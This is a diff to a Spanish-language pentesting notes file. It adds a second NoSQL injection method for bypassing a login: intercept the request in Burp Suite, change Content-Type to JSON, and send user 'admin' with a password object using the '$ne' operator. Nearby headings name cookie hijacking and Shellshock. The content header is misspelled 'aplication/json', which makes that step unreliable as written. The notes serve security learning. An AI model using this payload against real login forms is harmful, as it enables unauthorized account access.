@@ -296,6 +296,22 @@ En esta no tocaremos la petición mas que para `cambiar` un poco la parte de las
 user=admin&password[$ne]=uwu
 ```
 
+`SEGUNDA:`
+
+El anterior metodo no siempre funciona, pero tambien podemos mandar la 	informacion en `json`, así que:
+
+Primero en burpsuite en `capturamos la petición` del login y `cambiamos` la linea donde pone `Content-Type` por: Content-Type: `aplication/json`
+luego `donde el user y password lo reemplazaremos por` lo siguiente:
+	
+  ```json  
+    {
+			"user": "admin",
+			"password":{
+				"$ne":"uwu"
+			}
+		}
+```
+
 # COOKIE HIJACKING
 
 # SHELL SHOCK
